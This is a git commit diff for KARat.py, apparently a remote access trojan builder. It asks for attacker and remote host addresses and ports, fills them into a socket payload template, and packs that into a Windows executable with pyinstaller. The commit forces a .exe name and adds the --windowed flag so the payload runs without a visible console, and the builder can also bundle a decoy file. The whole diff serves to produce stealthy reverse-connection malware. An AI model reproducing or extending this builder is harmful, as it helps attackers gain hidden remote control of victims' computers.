3c79afd6800286de2737681027cc8767646f1f4e
Livqonn <88245375+KaygusuzAbdal@users.noreply.github.com>
2023-03-22 15:53:17 +0300

    Update KARat.py

--- KARat.py
+++ KARat.py
@@ -7,7 +7,7 @@ from urllib.request import urlopen
 d = str(urlopen("http://checkip.dyndns.com/").read())
 IPAddr = re.compile(r"Address: (\d+\.\d+\.\d+\.\d+)").search(d).group(1)
 
-RHOST = input("RHOST ("+IPAddr+" / not recommended): ")
+RHOST = input("RHOST (" + IPAddr + " / not recommended): ")
 if RHOST == "":
     RHOST = IPAddr
 RPORT = input("RPORT (8080): ")
@@ -18,9 +18,9 @@ default_lhost = ""
 if_config = subprocess.check_output(["ifconfig", "wlan0"]).decode()
 ip_addr = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", if_config)
 if ip_addr:
-    default_lhost = "("+ip_addr.group(0)+")"
+    default_lhost = "(" + ip_addr.group(0) + ")"
 
-LHOST = input("LHOST "+default_lhost+": ")
+LHOST = input("LHOST " + default_lhost + ": ")
 if LHOST == "" and ip_addr:
     LHOST = ip_addr.group(0)
 elif LHOST == "":
@@ -31,6 +31,9 @@ if LPORT == "":
     LPORT = 8080
 
 file_name = input("executable name: ")
+if (".exe" not in file_name) and (not file_name == ""):
+    file_name += ".exe"
+
 added_file_name = ""
 file_choice = input("Do you want to add file to your executable ? (y/N)")
 file_path = ""
@@ -38,9 +41,8 @@ if not file_choice == "" and file_choice.lower() == "y":
     file_path = input("file path:")
     added_file_name = os.path.basename(file_path)
 
-
 f = open("logs/variable_logs.txt", "a")
-f.write(datetime.now().strftime("\n# "+"%d/%m/%Y-%H:%M:%S") + " {'LHOST':'" + str(LHOST) + "','LPORT':" + str(LPORT) + ",'RHOST':'" + str(RHOST) + "','RPORT':" + str(RPORT) + "}")
+f.write(datetime.now().strftime("\n# " + "%d/%m/%Y-%H:%M:%S") + " {'LHOST':'" + str(LHOST) + "','LPORT':" + str(LPORT) + ",'RHOST':'" + str(RHOST) + "','RPORT':" + str(RPORT) + "}")
 f.close()
 
 with open("socket_file.py", "r") as sc:
@@ -76,21 +78,20 @@ with open("socket_file.py", "w") as sc:
 
 try:
     if file_name == "" and (not added_file_name == "" or not file_path == ""):
-        subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)], stdout=subprocess.DEVNULL)
+        subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path), "--windowed"],stdout=subprocess.DEVNULL)
     elif file_name == "":
-        subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
+        subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--windowed"], stdout=subprocess.DEVNULL)
     else:
-        subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
+        subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile", "--windowed"], stdout=subprocess.DEVNULL)
 except Exception as e:
     user_choice = input("You must install 'pyinstaller' module. Do you want me to install it for you ? (Y/n)")
     if user_choice == "" or user_choice.lower() == "y":
         subprocess.run(["python3", "-m", "pip", "install", "pyinstaller"])
         if file_name == "" and (not added_file_name == "" or not file_path == ""):
-            subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)],
-                           stdout=subprocess.DEVNULL)
+            subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path), "--windowed"],stdout=subprocess.DEVNULL)
         elif file_name == "":
-            subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
+            subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--windowed"], stdout=subprocess.DEVNULL)
         else:
-            subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
+            subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile", "--windowed"], stdout=subprocess.DEVNULL)
     else:
         exit()
